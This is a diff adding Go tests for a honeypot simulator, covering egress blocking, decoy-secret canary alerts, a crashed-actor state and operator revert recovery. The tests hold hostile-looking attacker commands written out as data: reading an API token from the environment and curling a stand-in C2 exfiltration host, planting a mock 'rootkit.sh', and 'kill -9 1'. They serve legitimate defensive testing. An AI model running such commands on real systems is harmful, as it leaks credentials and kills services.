@@ -667,5 +667,123 @@ func TestHoneypotGatewayPresenterAuthAndGoogleGate(t *testing.T) {
 	}
 }
 
+func TestHoneypotEgressPolicyAndMITMSecretProof(t *testing.T) {
+	ctx := context.Background()
+	backend := NewLocalSimulatorBackend("anything-but-agents", "honeypot")
+	actor := "honeypot-203-0-113-5"
+
+	shellResp, forensics, err := backend.ExecShell(ctx, actor, "env | grep PAYROLL_API_TOKEN && curl -sS --connect-timeout 2 https://c2.evil.example/exfil", "", "")
+	if err != nil {
+		t.Fatalf("ExecShell egress & MITM test: %v", err)
+	}
+
+	if !strings.Contains(shellResp.Stdout, "PAYROLL_API_TOKEN=ate-secret://k8s.io/default/anything-but-agents/payroll-vault-api/token") {
+		t.Fatalf("expected PAYROLL_API_TOKEN ate-secret:// URI in stdout, got %q", shellResp.Stdout)
+	}
+	if !strings.Contains(shellResp.Stderr, "EgressPolicy 'default' denied outbound connection") {
+		t.Fatalf("expected EgressPolicy block message in stderr, got %q", shellResp.Stderr)
+	}
+	if forensics.EgressSecurityProof.BlockedEgressAttempts < 1 {
+		t.Fatalf("expected BlockedEgressAttempts >= 1, got %+v", forensics.EgressSecurityProof)
+	}
+	if forensics.EgressSecurityProof.CredentialInjectionURI != decoySecretURI {
+		t.Fatalf("expected CredentialInjectionURI %q, got %q", decoySecretURI, forensics.EgressSecurityProof.CredentialInjectionURI)
+	}
+
+	hasSecretRule := false
+	hasEgressRule := false
+	for _, a := range forensics.CanaryAlerts {
+		if a.Rule == "MITM_SECRET_PLACEHOLDER_OBSERVED" {
+			hasSecretRule = true
+		}
+		if a.Rule == "EGRESS_POLICY_BLOCKED" {
+			hasEgressRule = true
+		}
+	}
+	if !hasSecretRule || !hasEgressRule {
+		t.Fatalf("expected MITM_SECRET_PLACEHOLDER_OBSERVED and EGRESS_POLICY_BLOCKED canary alerts, got %+v", forensics.CanaryAlerts)
+	}
+}
+
+func TestHoneypotCrashedStateRefusalAndRevertRecovery(t *testing.T) {
+	backend := NewLocalSimulatorBackend("anything-but-agents", "honeypot")
+	gw := NewGatewayServer(backend)
+	srv := httptest.NewServer(gw.Mux())
+	defer srv.Close()
+
+	// 1. Plant rootkit.sh -> auto-checkpoints v2
+	plantBody := `{"actor_name":"honeypot-203-0-113-5","cmd":"printf '#!/bin/sh\necho keepme\n' > rootkit.sh"}`
+	respPlant, err := http.Post(srv.URL+"/api/attacker/exec", "application/json", strings.NewReader(plantBody))
+	if err != nil {
+		t.Fatalf("POST plant: %v", err)
+	}
+	respPlant.Body.Close()
+
+	// 2. Attacker executes 'kill -9 1' -> transitions actor to CRASHED (exit 137) without overwriting v2
+	crashBody := `{"actor_name":"honeypot-203-0-113-5","cmd":"kill -9 1"}`
+	respCrash, err := http.Post(srv.URL+"/api/attacker/exec", "application/json", strings.NewReader(crashBody))
+	if err != nil {
+		t.Fatalf("POST crash: %v", err)
+	}
+	defer respCrash.Body.Close()
+	if respCrash.StatusCode != http.StatusOK {
+		t.Fatalf("POST crash status = %d", respCrash.StatusCode)
+	}
+	var crashRes GatewayActionResponse
+	if err := json.NewDecoder(respCrash.Body).Decode(&crashRes); err != nil {
+		t.Fatalf("decode crashRes: %v", err)
+	}
+	if crashRes.Status != "CRASHED" {
+		t.Fatalf("expected actor Status=CRASHED after kill -9 1, got %q", crashRes.Status)
+	}
+	if crashRes.Shell == nil || crashRes.Shell.ExitCode != 137 {
+		t.Fatalf("expected shell exit code 137, got %+v", crashRes.Shell)
+	}
+
+	// 3. Subsequent shell command while CRASHED is refused with 409 Conflict (control plane refuses wakeup)
+	blockedBody := `{"actor_name":"honeypot-203-0-113-5","cmd":"ls -la"}`
+	respBlocked, err := http.Post(srv.URL+"/api/attacker/exec", "application/json", strings.NewReader(blockedBody))
+	if err != nil {
+		t.Fatalf("POST blocked exec: %v", err)
+	}
+	defer respBlocked.Body.Close()
+	if respBlocked.StatusCode != http.StatusConflict {
+		t.Fatalf("expected 409 Conflict when executing command on CRASHED actor, got %d", respBlocked.StatusCode)
+	}
+	errBytes, _ := io.ReadAll(respBlocked.Body)
+	if !strings.Contains(string(errBytes), "ACTOR_STATE_CRASHED") {
+		t.Fatalf("expected ACTOR_STATE_CRASHED message in 409 response, got %q", string(errBytes))
+	}
+
+	// 4. Operator runs /api/soc/revert (kubectl ate revert actor) -> resets actor from CRASHED to RUNNING at v2!
+	revertBody := `{"actor_name":"honeypot-203-0-113-5","target_version":2}`
+	respRev, err := http.Post(srv.URL+"/api/soc/revert", "application/json", strings.NewReader(revertBody))
+	if err != nil {
+		t.Fatalf("POST /api/soc/revert: %v", err)
+	}
+	defer respRev.Body.Close()
+	var revRes GatewayActionResponse
+	if err := json.NewDecoder(respRev.Body).Decode(&revRes); err != nil {
+		t.Fatalf("decode revRes: %v", err)
+	}
+	if revRes.Status != "RUNNING" {
+		t.Fatalf("expected Status=RUNNING after revert recovery, got %q", revRes.Status)
+	}
+	if _, ok := revRes.Forensics.FilesInRootfsTmp["rootkit.sh"]; !ok {
+		t.Fatalf("expected rootkit.sh intact after revert from CRASHED")
+	}
+
+	// 5. Shell commands succeed again after revert recovery
+	afterBody := `{"actor_name":"honeypot-203-0-113-5","cmd":"cat rootkit.sh"}`
+	respAfter, err := http.Post(srv.URL+"/api/attacker/exec", "application/json", strings.NewReader(afterBody))
+	if err != nil {
+		t.Fatalf("POST after recovery: %v", err)
+	}
+	defer respAfter.Body.Close()
+	if respAfter.StatusCode != http.StatusOK {
+		t.Fatalf("expected 200 OK after revert recovery, got %d", respAfter.StatusCode)
+	}
+}
+
 
 
